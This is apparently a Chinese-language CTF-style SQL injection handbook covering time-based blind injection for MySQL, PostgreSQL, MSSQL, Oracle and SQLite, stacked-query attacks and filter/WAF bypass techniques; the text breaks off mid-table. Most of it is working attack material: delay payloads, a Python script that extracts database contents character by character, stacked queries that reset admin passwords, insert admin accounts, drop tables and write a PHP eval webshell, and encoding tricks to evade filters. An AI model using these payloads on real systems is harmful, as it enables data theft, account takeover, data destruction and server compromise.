## [g-blind-time] 时间盲注——连真假差异都没有时，用延迟当"真"的信号
### [blind-time-db] 各数据库时间函数对照 | medium | 时间盲注;pg_sleep;WAITFOR;benchmark;对照 | -
> 换数据库就要换延迟函数，先识别库再选对应 payload，本条目给出各库延迟函数全家桶与完整利用流程。

#### 这个条目的作用
时间盲注的原理一句话：**条件为真 → 让查询睡几秒 → 响应变慢**。但"让查询睡几秒"这句话在不同数据库里是完全不同的函数和语法：MySQL 写 `SLEEP(3)`，MSSQL 却要写 `WAITFOR DELAY`，SQLite 干脆没有睡眠函数。本条目的作用就是让你拿到任意一个注入点后，能先认库、再选出正确的时间函数，把时间盲注跑通。它是纯"查表 + 套模板"的活儿，不需要理解数据库内部机制。

#### 前置条件
- 确认注入点存在且**无任何回显**（union 和报错都试过了，页面既不显示数据也不报错）。
- 确认页面响应时间本身稳定（网络抖动小于 0.5 秒），否则真假难分。
- 能手动修改请求参数（浏览器开发者工具或 Burp 都行），并会看响应耗时。
- 准备一个判断标准：真条件延迟约 3 秒、假条件秒回。

#### 第 1 步：先识别数据库类型
时间函数是分库的，写错函数直接报错或不生效，所以第一步永远是认库。按成本从低到高试：

```txt
1. 报错信息：MySQL/Oracle 自带版本号报错，最容易认
2. 注释符：能正常注释的是 MySQL（# 是 MySQL 专属）
3. 版本函数：union 回显里直接 SELECT version() 全家桶
4. 字符串连接：|| 能用是 PG/SQLite/Oracle，MSSQL 必须用 +
```

认准后再去下表选延迟函数。如果实在认不出，就**每个库的延迟函数各试一次**，哪个让页面变慢就说明是哪个库——注意 SQLite 没有延迟函数，靠重型计算。

> [!tip]
> 认库时优先看 `#` 注释：`?id=1' #` 不报错 → MySQL，一步锁定，比猜函数快得多。

#### 第 2 步：MySQL——SLEEP 与 BENCHMARK
MySQL 有两个延迟函数，二选一：

```sql
-- 核心模板：条件真才睡 3 秒
?id=1 AND IF(ASCII(SUBSTR(DATABASE(),1,1))>64,SLEEP(3),0) --+
?id=1 AND SLEEP(IF(ASCII(SUBSTR(DATABASE(),1,1))=100,3,0)) --+
?id=1 AND ORD(MID(DATABASE(),1,1))=100 AND SLEEP(3) --+

-- BENCHMARK 变体：循环执行表达式制造 CPU 延迟
?id=1 AND IF(1=1,BENCHMARK(10000000,SHA1('x')),0) --+
```

- `SLEEP(3)`：直接睡 3 秒，最直观，优先用。
- `BENCHMARK(10000000,SHA1('x'))`：把 `SHA1('x')` 循环执行一千万次，靠 CPU 运算拖时间。`BENCHMARK` 返回 0 恒为假，必须配合 `IF` 用。
- 三种写法等价，哪个没被过滤用哪个（比如过滤了 `IF` 就用第三种 `AND ... AND SLEEP(3)`）。

#### 第 3 步：PostgreSQL——pg_sleep
PG 的 `pg_sleep(n)` 返回类型是 `void`（空），不能直接放在 `AND` 后面当布尔值用，会报 `argument of AND must be type boolean, not type void`。正确的姿势是利用**函数调用可当表**的语法把它包起来：

```sql
-- 正确写法：FROM pg_sleep(3) 当作一张只有一行的表，SELECT 1 出来
?id=1 AND (SELECT 1 FROM pg_sleep(3))=1 --+

-- 配合条件判断猜数据
?id=1 AND (SELECT 1 FROM pg_sleep(CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>64 THEN 3 ELSE 0 END))=1 --+
```

> [!warn]
> 直接写 `AND pg_sleep(3) --+` 在 PG 里会报类型错误而不是延迟——这是 PG 时间盲注最常见的坑，忘了 `(SELECT 1 FROM ...)` 的包装就一定失败。

#### 第 4 步：MSSQL——WAITFOR DELAY
MSSQL 没有"函数"式延迟，`WAITFOR DELAY '时:分:秒'` 是一条**独立语句**，不能当表达式塞进 WHERE，必须用分号另起一句：

```sql
-- 基础：无条件延迟
?id=1; WAITFOR DELAY '0:0:3' --

-- 带条件：ASCII(SUBSTRING(DB_NAME(),1,1))>64 为真才睡 3 秒
?id=1; IF ASCII(SUBSTRING(DB_NAME(),1,1))>64 WAITFOR DELAY '0:0:3' --
```

- 时间格式严格是 `'0:0:3'`（时:分:秒），写成 `'3'` 会报错。
- MSSQL 取当前库用 `DB_NAME()`，截取用 `SUBSTRING(str,pos,len)`，与 MySQL 的 `SUBSTR`/`DATABASE()` 不同，别混。

#### 第 5 步：Oracle——DBMS_LOCK.SLEEP 及其替代
Oracle 的延迟函数是 `DBMS_LOCK.SLEEP(n)`，但它**默认只授权给 SYS**，普通用户调用会报 `insufficient privileges`，所以要先试权限：

```sql
-- 有权限时（SYS 或已授权用户）
?id=1 AND DBMS_LOCK.SLEEP(3) IS NULL --

-- 没权限时：用大笛卡尔积拖时间（all_objects 自连接）
?id=1 AND (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c)>0 --
```

- 新版 Oracle（10g+）把 DBMS_LOCK 的执行权限收得更紧，报错就直接换笛卡尔积。
- 笛卡尔积行数是 `all_objects 行数^3`，几万行一乘就是上亿行，查询秒级延迟，条件化写法：

```sql
?id=1 AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ASCII(SUBSTR((SELECT sys_context('USERENV','CURRENT_SCHEMA') FROM dual),1,1))>64)>0 --
```

#### 第 6 步：SQLite——没有睡眠函数，用重型计算代替
SQLite 是嵌入式数据库，**没有内置 sleep**，时间盲注要靠"分配大内存 / 大计算"来制造延迟：

```sql
-- randomblob(N)：分配 N 字节随机串，N 越大越慢（1e8 ≈ 100MB，肉眼可见延迟）
?id=1 AND (SELECT length(randomblob(100000000)))>0 --

-- 笛卡尔积：sqlite_master 自连接放大行数
?id=1 AND (SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)>0 --
```

- `randomblob` 需要 `length()` 包一层，否则空串参与比较不出延迟。
- 100MB 分配在慢机器上可到 1 秒以上；不够就加零，`1000000000`（1GB）非常慢，注意别把目标拖死。
- SQLite 没有 `DATABASE()`，当前库就是数据库文件本身，直接查 `sqlite_master` 的表名即可。

#### 第 7 步：把"手点"升级成脚本
时间盲注一次只能猜一个字符的一位，纯手点不现实。用 Python 二分 + 超时判定，把"响应慢 = 真"量化：

```python
import requests, time

url = "http://target/index.php"
DB = "DATABASE()"          # MySQL；PG 改 current_database()，MSSQL 改 DB_NAME()
DELAY = 3                  # 与网络延迟拉开差距

def delay_cond(expr):
    """expr 为真 → 页面延迟约 3 秒 → 返回 True"""
    payload = f"1 AND IF({expr},SLEEP({DELAY}),0) --+"
    try:
        r = requests.get(url, params={"id": payload}, timeout=DELAY + 2)
        return r.elapsed.total_seconds() >= DELAY - 0.5
    except requests.Timeout:          # 超时本身就是"真"的信号
        return True

def guess_char(expr):
    lo, hi = 32, 127
    while lo < hi:                    # 二分：7 次猜出一个字符
        mid = (lo + hi + 1) // 2
        if delay_cond(f"ASCII(SUBSTR({expr},{pos},1))>{mid}"):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)

res = ""
n = 50                                # 先猜长度，再逐字符
for pos in range(1, n + 1):
    res += guess_char(f"{DB}", pos)   # 实现里把 pos 传进表达式
print(res)
```

> [!warn]
> 时间盲注每猜一个字符要发 7~8 个请求，一个 30 字符的 flag 就是两百多次请求，务必加 `time.sleep` 限速，别把目标打崩、也别让自己被 WAF 封 IP。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 请求后报错 `argument of AND must be type boolean` | PG 的 pg_sleep 返回 void，直接放 AND 后面 | 用 `(SELECT 1 FROM pg_sleep(3))=1` 包装 |
| `WAITFOR` 语法错误 | MSSQL 延迟是语句不是函数，且格式必须是 `'0:0:3'` | 用 `;IF ... WAITFOR DELAY '0:0:3' --`，时间写全时分秒 |
| `DBMS_LOCK.SLEEP` 权限不足 | 普通 Oracle 用户默认无执行权限 | 换笛卡尔积 `all_objects` 自连接 |
| SQLite 没有任何延迟 | SQLite 无内置 sleep 函数 | 用 `randomblob(100000000)` 或大笛卡尔积 |
| 真条件也秒回 | 延迟值太小被网络抖动掩盖 | 延迟加大到 5 秒，且先手动验证一个已知真假条件 |
| 所有函数都不生效 | 库认错了，函数与库不匹配 | 先用 `#` 注释、报错信息、版本函数把库认死再打 |

#### 实战要点
- 阈值选 3~5 秒：太小被网络波动吞掉，太大浪费每次请求的等待时间。
- 认库优先级：`#` 注释可用 → MySQL；`||` 可用 → PG/SQLite/Oracle；`+` 连接 → MSSQL；报错带版本号 → 直接看版本。
- 时间盲注最适合"无回显 + 无报错 + 无布尔差异"的极端场景，只要有 union 或布尔差就优先用它们，时间盲注是最后手段。
- 脚本里用 `except requests.Timeout` 捕获超时作为"真"，比算 elapsed 更稳。
- Oracle 的 DBMS_LOCK 在新版受限、MSSQL 的 WAITFOR 不能当表达式，这两个最容易写错，直接背模板。
- 大规模猜数据前先猜 `LENGTH()`，能少发一整轮请求。

## [g-stack] 堆叠注入——分号后的第二条语句，从"读"升级为"写"
### [stack-basic] 堆叠注入原理与限制 | medium | 堆叠注入;多语句;PDO;限制 | -
> 部分数据库驱动允许一条请求执行多条语句，注入点后加分号就能追加任意 SQL，但前提是驱动开了多语句支持，且没有回显。

#### 这个条目的作用
普通注入（union/盲注）只能做**查询**，而堆叠注入（stacked queries）能执行**任意 SQL**：改密码、删表、插数据、写马。但堆叠不是"加分号就能用"——它依赖后端驱动是否允许多语句执行，且执行结果通常拿不到回显。本条目讲清楚三件事：原理是什么、驱动什么时候放行、以及为什么堆叠"只能写不能读"。

#### 前置条件
- 已确认注入点存在（先验证 `1' AND 1=1` 与 `1' AND 1=2` 有差异）。
- 知道后端语言/驱动类型（看响应头、报错信息、或者题目描述）。
- 一个能修改请求的抓包工具，因为堆叠注入经常要配合 POST 或修改 Content-Type。

#### 第 1 步：理解原理——分号后是"另一条独立语句"
正常的注入是改写**同一条** SQL 的语义（union 就是拼第二条 SELECT 进原语句）。堆叠注入不一样：数据库把分号当作语句分隔符，`;` 后面的内容会被当作**全新的一条语句**执行：

```sql
-- 应用原本执行的语句
SELECT * FROM users WHERE id = 1;

-- 注入后实际执行（分号追加第二条语句）
SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

执行顺序：先跑 `SELECT`，再跑 `DROP TABLE users`。这就是堆叠最危险的地方——它不只是"读"，而是"任意执行"。

#### 第 2 步：测试当前环境是否支持多语句
堆叠能不能用，取决于**驱动**而不是数据库本身。最快的测试：先跑一个无副作用的第二条语句看反应：

```sql
-- 测试 1：加一条无害的 SELECT，观察是否报语法/驱动错误
?id=1; SELECT 1 --

-- 测试 2：加一条会造成可见影响的语句
?id=1; UPDATE users SET password='x' WHERE username='guest' --
```

- 测试 1 不报错 → 大概率支持多语句。
- 测试 2 之后登录/查询发现数据变了 → 实锤支持，而且能改数据。
- 直接报 `You have an error in your SQL syntax` 或"仅允许单条语句" → 驱动没开多语句，此路不通，回去用 union/盲注。

> [!warn]
> 别一上来就 `DROP TABLE`，先拿 `; SELECT 1` 和一条 UPDATE 试水，避免把题目环境打坏。

#### 第 3 步：对照驱动支持表，判断为什么"有时行有时不行"
| 环境 | 是否支持多语句 | 说明 |
| --- | --- | --- |
| PHP mysql 扩展（旧） | 支持 | 已废弃，老题目常见 |
| PHP mysqli | 支持 | 默认支持 |
| PHP PDO + MySQL | **默认不支持** | 需显式加 `PDO::MYSQL_ATTR_MULTI_STATEMENTS => true` |
| PDO + emulate prepares=false | 不支持 | 预编译后参数无法注入，堆叠彻底失效 |
| Java JDBC | **默认不支持** | 需连接串加 `allowMultiQueries=true` |
| Python pymysql | 默认支持 | `execute()` 天然可执行多语句 |
| Node mysql / mysql2 | 默认支持 | 常见于 Node 写的题目 |

这张表解释了一个经典现象：**同一个 SQL 注入点，换一种后端语言堆叠就不生效了**。MySQL 本身支持多语句，是驱动的"安全默认值"把它关掉了。做题时从报错风格猜语言，再对表判断。

#### 第 4 步：理解致命限制——堆叠没有回显
多条语句的结果集只有**第一条**会被返回给应用，`; SELECT ...` 后面的查询结果页面根本拿不到：

```sql
-- 下面的 password 不会显示在页面上
?id=1; SELECT password FROM users --
```

所以堆叠不能用来"读数据拿 flag"（那是 union/盲注的活），它擅长的是**不需要回显的副作用操作**：

| 能做的 | 不能做的 |
| --- | --- |
| UPDATE 改数据、INSERT 插数据、DELETE 删数据 | SELECT 读数据（结果不回显） |
| 建表、改表结构、建/删用户 | 靠页面"看到"查询结果 |
| 写 webshell（配合 INTO OUTFILE） | 在 PDO/JDBC 默认配置下用 |

#### 第 5 步：给"不支持"的环境开多语句（审计视角）
做题时你改不了服务端代码，但**审计代码时**要知道多语句是怎么被打开的——这是堆叠注入的根因：

```php
// PDO：显式开启多语句（默认关闭）
$pdo = new PDO($dsn, $user, $pass, [
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => true
]);

// Java JDBC：连接串加参数（默认关闭）
jdbc:mysql://localhost/db?allowMultiQueries=true

// 反例（安全）：预编译 + 不模拟预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");  // 参数化，无法注入
```

> [!tip]
> 看到 `MYSQL_ATTR_MULTI_STATEMENTS => true` 或 `allowMultiQueries=true` 就高度警惕：代码里只要还有一个字符串拼接的 SQL，就是堆叠注入点。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 注入 `; SELECT 1` 直接报语法错 | 驱动不支持多语句（PDO/JDBC 默认关） | 确认语言后改用 union/盲注，别在堆叠上耗 |
| 堆叠后页面白屏/无反应 | 第二条语句报错被吞，或语句没写完整 | 确保第二条语句末尾有注释符 `--` 截断尾部 |
| 同一种语句时灵时不灵 | 换过后端语言，驱动支持度不同 | 对照"驱动支持表"重新判断 |
| 想用堆叠读 flag 读不到 | 堆叠的结果集不回显 | 改用 union/报错/盲注读数据，堆叠只用于写操作 |
| 报错提示"仅允许单条语句" | 预编译 + 参数化，注入点本身已封死 | 放弃该注入点，找其他拼接点 |

#### 实战要点
- 堆叠注入的定位：**写数据、拿 shell 用堆叠；读数据用 union/盲注**，两者配合打完整条链。
- 先测 `; SELECT 1` 探支持度，再测 UPDATE 探权限，最后才上高危语句。
- 分号后第二句也要用 `--` 或 `#` 截断，否则原 SQL 的尾巴会拼进第二条语句导致报错。
- 判断后端语言：PHP 报错带 `mysqli`、Java 带 `com.mysql`、Python 常见 `pymysql` 字样。
- 堆叠 + 时间盲注是绝配：第二句里写 `IF(cond,pg_sleep(3),0)` 之类，等于给"不能读"的堆叠开了个读通道。

### [stack-example] 堆叠注入实战示例 | hard | 堆叠注入;改数据;写马;SQLite | -
> 堆叠的经典用法：改管理员密码、插用户、写 webshell，附 SQLite 实战（CTF 高频），一步步演示从注入到拿 flag 的完整链路。

#### 这个条目的作用
原理懂了，但"改密码"和"拿 flag"之间还差一串具体操作。本条目是堆叠注入的**实战手册**：改密码、插用户、写 webshell 三个高频场景各给完整 payload，再单独讲 CTF 里出镜率最高的 SQLite 堆叠场景（admin 被删、密码是 MD5 这类刁钻设定），最后教你怎么在无回显的情况下确认自己改成功了。

#### 前置条件
- 已确认环境支持多语句（先按 stack-basic 的第 2 步测 `; SELECT 1`）。
- 知道目标库类型（MySQL 写马需要 FILE 权限；SQLite 是文件库，玩法完全不同）。
- 有一个可观察的"验证点"：登录页、详情页、或者题目给的查询功能。

#### 第 1 步：改管理员密码——堆叠最经典的一招
很多题目的 flag 在"登录管理员账号"之后，而管理员密码你知道是 MD5 形式但不知道明文，或者题目直接让你"把密码改成 xxx"：

```sql
-- 把 admin 的密码改成 '123456'（明文还是哈希取决于表结构）
?id=1; UPDATE users SET password='123456' WHERE username='admin'; --

-- 更稳妥：直接改成常见哈希（MD5('1') = c4ca4238a0b923820dcc509a6f75849b）
?id=1; UPDATE users SET password='c4ca4238a0b923820dcc509a6f75849b' WHERE username='admin'; --
```

执行后去登录页用 `admin / 1`（或 `admin / 123456`）登录，登录成功 = 注入生效。

> [!warn]
> 密码字段存的是哈希还是明文，取决于应用逻辑：先随便改个值试试登录，报"密码错误"就说明字段是明文；成功登录但页面提示错误再换哈希写法。有些题目密码字段是 `passwd`、`pwd`，先用 union 或 `sqlite_master` 确认列名。

#### 第 2 步：插入新用户——不想动 admin 时的备选
改密码可能触发"账号被锁"之类的逻辑，插一个新用户更隐蔽：

```sql
-- 插入新用户（列名、数量要和表结构一致）
?id=1; INSERT INTO users(username,password) VALUES('hack','hack'); --

-- 注册接口被禁用时，直接走后端表
?id=1; INSERT INTO users(id,username,password,role) VALUES(99,'hack','hack','admin'); --
```

字段数量对不上会报 `Column count doesn't match`，报错信息正好帮你数出表有几列。插完用新账号登录验证。

#### 第 3 步：写 webshell——从注入到 getshell（MySQL）
注入点如果跑在 MySQL 且账号有 FILE 权限，可以直接把一句话木马写进 Web 目录：

```sql
-- 写一句话马（需要 FILE 权限 + secure_file_priv 允许 + 目录可写）
?id=1; SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/s.php'; --
```

写成功后用蚁剑/菜刀连接 `http://target/s.php`，密码 `1`。写马的三道门槛缺一不可：

| 门槛 | 验证方法 |
| --- | --- |
| 有 FILE 权限 | `--is-dba` 或 `SELECT file_priv FROM mysql.user` |
| secure_file_priv 允许 | `SHOW VARIABLES LIKE 'secure_file_priv'`，为 NULL 禁止、空串不限制 |
| Web 目录可写 + 路径已知 | 报错信息、`@@datadir`、常见路径 `/var/www/html` |

> [!danger]
> secure_file_priv 为 NULL 时 OUTFILE 必然失败，别浪费时间；此时改走 general_log 日志写马（需 SUPER 权限），或放弃写马改打别的链。

#### 第 4 步：SQLite 实战——CTF 高频场景
SQLite 是文件数据库，CTF 题目常把用户表塞进 SQLite，且喜欢出"admin 被删了"或"密码是个 hash"的刁钻设定。核心思路：**先探表结构，再改数据**。

```sql
-- 探结构：把建表语句读出来（sqlite_master 存着所有表）
?id=1; SELECT sql FROM sqlite_master WHERE name='users'; --
```

拿到表结构后按需操作。经典三连（admin 被删时先改名备份、再建回、再改密码）：

```sql
-- 场景 A：admin 行被删了 → 把别的用户改名成 admin，再改密码
?id=1; UPDATE users SET username='admin' WHERE username='guest'; --
?id=1; UPDATE users SET password='c4ca4238a0b923820dcc509a6f75849b' WHERE username='admin'; --

-- 场景 B：题目要求"重建 users 表"（表被删/结构坏了）
?id=1; ALTER TABLE users RENAME TO tmp; --          -- 旧表改名保数据
?id=1; CREATE TABLE users AS SELECT * FROM tmp; --   -- 按旧表结构建新表
?id=1; UPDATE users SET password='c4ca4238a0b923820dcc509a6f75849b' WHERE username='admin'; --
```

SQLite 的 `CREATE TABLE users AS SELECT` 会按 SELECT 结果自动建表，是"重建"最省事的写法。`c4ca4238a0b923820dcc509a6f75849b` 是 `MD5('1')`，登录密码就是 `1`。

#### 第 5 步：无回显时确认成功——观察副作用
堆叠不返回结果集，怎么知道改没改成功？三招：

```txt
1. 功能验证：改完密码去登录页用新密码登，成功即生效（最常用）
2. 二次读取：用 union/盲注把改完的字段读出来比对
3. 报错反推：故意写错（如 WHERE username='不存在'）看是否影响 UPDATE 的行数语义
```

> [!tip]
> 登录页是最佳验证点：`admin / 1` 能进系统，说明 UPDATE 命中了行；进不去就检查列名、哈希格式、或者行到底存不存在（先 union 读一下 `SELECT username FROM users`）。

#### 第 6 步：进阶——堆叠 + 盲注读数据
堆叠自己不能读，但可以**借延迟函数当盲注通道**，把"写"升级成"读"：

```sql
-- 条件为真才睡 3 秒（MySQL），等价于把 SELECT 结果"延迟编码"出来
?id=1; SELECT IF(ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))>64,SLEEP(3),0); --
```

逐字符二分猜，配合 Python 脚本（见 blind-time-db 第 7 步的模板，把表达式换成这里的 SELECT）就能把堆叠注入变成完整拖库工具。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| UPDATE 后登录还是失败 | 列名/表名写错，或密码字段是哈希而你写了明文 | 先 union/`sqlite_master` 确认表结构和密码存储格式 |
| `Column count doesn't match` | INSERT 的列数 ≠ 表列数 | 把报错当提示，补全列数或只写必填列 |
| INTO OUTFILE 报 `secure_file_priv` 错误 | MySQL 禁止写文件 | 检查 secure_file_priv，NULL 就换 general_log 写马 |
| 第二句语句报语法错 | 原 SQL 的尾巴拼进了第二条语句 | 第二句末尾补 `--` 或 `#` 截断 |
| 页面毫无变化 | UPDATE 条件没命中任何行 | 先用 SELECT 确认目标行存在（比如 admin 真的被删了） |
| CREATE TABLE 报"已存在" | 目标表本来就存在 | 先 RENAME 或 DROP，再 CREATE |

#### 实战要点
- 动手前先摸表结构：SQLite 看 `sqlite_master`，MySQL 看 `information_schema`，列名对不上一切白搭。
- 改密码优先用 MD5 已知值（如 `MD5('1')`），避免不知道应用怎么校验密码格式。
- 写马是三条链里要求最高的（FILE 权限 + secure_file_priv + 可写目录），先验证再写，别盲试。
- 无回显的确认全靠"副作用"：登录成功、数据变化、页面报错都是信号。
- 堆叠 + 时间盲注组合可以读数据，是堆叠注入的终极形态，遇到"只能写"的环境一定要会这招。

## [g-bypass] 过滤绕过——黑名单不是终点，空格大小写编码全是绕过面
### [bypass-space] 空格与注释符绕过 | medium | 空格绕过;%0a;注释;括号 | -
> 过滤了空格时，用注释符、控制字符或括号替代，让 SQL 语义不变，本条目给出替代方案全集与"反推过滤规则"的通用方法。

#### 这个条目的作用
WAF 或代码里最常见的过滤就是"去掉空格"——`union select` 变成 `unionselect` 直接语法错误。但 SQL 里空格的"语义"只是**分词符**，能被一堆等价物替代：注释、控制字符、括号。本条目让你掌握所有替代写法，并学会一套通用流程：**先反推过滤规则，再针对性绕过**，而不是瞎试 payload。

#### 前置条件
- 已确认注入点存在（union 或盲注的判定已经过了）。
- 已发现"带空格的 payload 被拦截/报错，去掉空格后行为不同"，即过滤确实针对空格。
- 能分辨"被 WAF 拦（403/返回拦截页）"与"被代码过滤（报 SQL 错误）"两种现象——排查思路完全不同。

#### 第 1 步：确认过滤对象——是空格还是整个关键字
先做对照实验，别急着猜：

```txt
?id=1' UNION SELECT 1,2,3 --+     → 被拦/报错
?id=1'/**/UNION/**/SELECT/**/1,2,3--+   → 通了？过滤的是空格
?id=1' UN/**/ION SEL/**/ECT 1,2,3 --+   → 通了？过滤的是关键字
```

- 第一组失败、第二组成功 → 过滤**空格**，用本条目。
- 两组都失败 → 关键字本身被过滤，去看 bypass-case（大小写/双写/编码）。
- 两组都成功 → 之前失败是别的原因（比如 `--+` 编码问题），先排查基础写法。

#### 第 2 步：用注释符替代空格——最常用
MySQL 把 `/**/`（空注释）当作一个空白字符，可以出现在任意需要空格的位置：

```sql
?id=1'/**/UNION/**/SELECT/**/1,2,3--+
?id=1'/**/AND/**/ASCII(SUBSTR(DATABASE(),1,1))>64--+
```

注释替代是**跨库通用**的（PG/MSSQL/Oracle/SQLite 都认 `/* */`），第一个试它。注意 MySQL 的 `--` 注释必须带空格，这里用 `--+`（`+` URL 解码成空格）或 `#` 收尾。

#### 第 3 步：用控制字符替代空格——MySQL 的隐藏空白
MySQL 把一批控制字符也当空白符，URL 编码后可以直接塞进 payload：

```txt
%09  = Tab
%0a  = 换行
%0b = 垂直制表
%0c = 换页
%0d = 回车
%a0  = 非断行空格
```

```sql
?id=1'%0aUNION%0aSELECT%0a1,2,3--+
?id=1'%09AND%09SLEEP(3)--+
```

> [!warn]
> 控制字符替代在 MySQL 里最可靠；PG/MSSQL 对其中一部分不认，跨库时优先 `/**/`。另外 `%0a` 常被 WAF 规则漏过，是绕过"正则匹配单行 payload"的利器。

#### 第 4 步：用括号替代空格——连注释都不用
SQL 里**函数调用和表达式**可以完全不含空格：`SELECT` 后直接跟括号表达式，`UNION` 和 `SELECT` 之间用括号隔开：

```sql
-- 括号包裹每个字段，整个 SELECT 无空格
?id=-1'UNION(SELECT(1),(2),(3))--+
?id=1'AND(ASCII(SUBSTR(DATABASE(),1,1))>64)--+

-- 混合：SELECT 字段用括号，FROM 表名用反引号
?id=-1'UNION(SELECT(1),database(),(3))--+
```

括号法在 MySQL 里几乎万能（`SELECT(1)`、`AND(条件)` 都合法），是空格被全面过滤时的终极方案。

#### 第 5 步：反推过滤正则——通用绕过流程
不知道过滤规则时，用"逐词测试"反推：把 payload 拆成一个个词单独测，看哪个词触发拦截：

```txt
?id=1' union --+        → 被拦？过滤了 union
?id=1' select --+       → 被拦？过滤了 select
?id=1' and --+          → 被拦？过滤了 and
?id=1' 1 --+            → 通过 → 空格本身没被过滤
```

结论：被过滤的是**关键字**而不是空格，那就用关键字拆分/双写（见 bypass-case），而不是继续折腾空格替代。反过来如果 `1` 和 `and` 都带空格被拦，才是空格过滤。

#### 第 6 步：关键字拆分——注释与双写让过滤失效
很多过滤是"把关键字替换成空字符串"或"正则匹配完整单词"。两个经典拆法：

```sql
-- 注释拆分：在关键字中间插入注释，正则匹配不到完整单词
?id=1' UN/**/ION SEL/**/ECT 1,2,3 --+

-- 双写：过滤把 select 变空，输入 seselectlect → 去掉一次 select → select
?id=1' ununionion seselectlect 1,2,3 --+
```

注释拆分和空格替代可以叠加：`?id=1'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--+` 同时绕过空格与关键字过滤。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `/**/` 替代后仍失败 | 过滤的不只是空格，还有关键字本身 | 用第 5 步逐词测试，确认过滤对象 |
| `%0a` 在其他库不生效 | 控制字符当空白是 MySQL 特性 | 跨库环境换 `/**/` 或括号 |
| 报错 "Unknown column" | 括号法里把列名也包进了括号（`(column)` 会变函数调用） | 只有**值/表达式**能包括号，表名列名别包 |
| 拦截但代码里没过滤 | 是 WAF 层（正则匹配整条 payload） | 用 `%0a` 换行拆分、URL 编码、或二次编码 |
| `--+` 不生效 | MySQL 的 `--` 注释要求后面跟空格，`+` 未解码 | 换 `#` 或用 `--%20` |

#### 实战要点
- 优先级：`/**/` → 控制字符（MySQL）→ 括号，从通用到特定，逐个试。
- 先判断"空格过滤"还是"关键字过滤"，判断错了后面全白费——逐词测试是唯一可靠方法。
- 括号法里记住：`SELECT(表达式)`、`AND(条件)`、`(值),(值)` 合法，列名/表名不包括号。
- 多层过滤就多层叠加：空格替代 + 关键字拆分 + 编码一起上。
- 括号法还顺带绕过了"过滤逗号"场景的一部分（`SELECT(1),(2)` 里逗号还在，但 `SUBSTR(a FROM b FOR c)` 可以完全无逗号，见 bypass-quote）。

### [bypass-case] 大小写、双写与编码绕过 | medium | 大小写;双写;hex;编码 | -
> 黑名单正则大多区分大小写且只过滤一次，大小写混淆、双写、hex 编码是三大基础绕过，本条目逐个演示并给出选型逻辑。

#### 这个条目的作用
过滤的实现通常是正则黑名单：`/union/i` 或 `/select/`。正则只要**区分大小写**或**只替换一次**，就有缝可钻。本条目讲透三大基础绕过——大小写混淆、双写、hex/URL 编码——以及它们各自适用的过滤类型，让你看到"被过滤"三个字就能立刻选对招式。

#### 前置条件
- 已确认过滤针对的是**关键字**（按 bypass-space 第 5 步逐词测试得出）。
- 能区分两种过滤实现：`被替换成空`（双写可破）和 `被拦截拒绝`（大小写/编码可破）。
- 会用 URL 编码和十六进制基本概念（`0x41` = 字符 `A`）。

#### 第 1 步：大小写混淆——对付"区分大小写"的正则
很多过滤正则没加 `i` 标志，只匹配小写 `union`、`select`。SQL 关键字本身不区分大小写，混写即可：

```sql
-- 原 payload
?id=-1' UNION SELECT 1,2,3 --+
-- 大小写混淆（只绕"区分大小写"的过滤）
?id=-1' UnIoN SeLeCt 1,2,3 --+
?id=-1' uNiOn sElEcT 1,2,3 --+
```

特点：零成本、一行搞定，但要先验证过滤是否区分大小写——`UNION` 全大写被拦、`UnIoN` 通过，就说明过滤区分大小写，此招有效。

> [!tip]
> 大小写混淆常与空格替代叠加：`?id=-1'/**/UnIoN/**/SeLeCt/**/1,2,3--+`，一套 payload 同时绕过两种过滤。

#### 第 2 步：双写绕过——对付"替换成空"的过滤
有些过滤把命中关键字**替换成空字符串**（`str_replace('select','')`），且只处理一遍。输入 `seselectlect`，去掉中间的 `select` 后正好剩下 `select`：

```sql
-- 过滤 select → select 变空 → 双写后还剩一个
?id=-1' ununionion seselectlect 1,2,3 --+

-- 配合空格替代
?id=-1'/**/ununionion/**/seselectlect/**/1,2,3--+

-- 双写同样适用于函数名、关键字
?id=1' AND ASCII(SUBSTR(DATABASE(),1,1))>64 --+
?id=1' AND AASCIISSCIISS((SUBSTR(DATABASE(),1,1)))>64 --+   -- 原理相同，看过滤名单
```

验证方法：`select` 被替换后 payload 里还有没有 `select`？有 → 双写生效。注意过滤是**递归替换**的话双写会失败（替换后再次扫描），先小规模试。

#### 第 3 步：hex 编码——字符串常量整体编码（绕引号过滤）
`0x...` 是 MySQL 的十六进制字面量，等价于字符串，且**不含引号**。字符串的每个字符取 ASCII 码拼起来：

```txt
'admin' → a=0x61 d=0x64 m=0x6d i=0x69 n=0x6e → 0x61646d696e
'flag'  → f=0x66 l=0x6c a=0x61 g=0x67 → 0x666c6167
```

```sql
-- 绕引号过滤：username 直接比较 hex 字面量
?id=1' AND username=0x61646d696e --+        -- = 'admin'

-- union 回显字符串常量
?id=1' UNION SELECT 1,0x666C6167,3 --+      -- 回显 'flag'
```

在线工具/`xxd`/Python 都能算 hex，别手算：

```python
print('flag'.encode().hex())   # 666c6167
```

> [!warn]
> hex 字面量只在 **MySQL** 生效！PG 要 `E'\x66...'` 转义串、MSSQL 的 `0x...` 是二进制不是字符串，跨库必须换写法（见 bypass-quote 的 CHAR 拼接）。

#### 第 4 步：URL 与二次编码——绕过 WAF 层
WAF 常先 URL 解码再匹配，但只解一次。应用层可能再解一次，于是**二次编码**（`%25` = `%`）能骗过 WAF 的正则匹配：

```txt
单引号 '          → URL 编码 %27
%27 再编码一次     → %2527（WAF 解一次剩 %27，应用再解一次变 '）
```

```sql
?id=1%2527 UNION SELECT 1,2,3 --+    -- WAF 看到 %2527 不匹配，应用解出裸引号
```

其他常见编码变体：

| 编码 | 示例 | 适用 |
| --- | --- | --- |
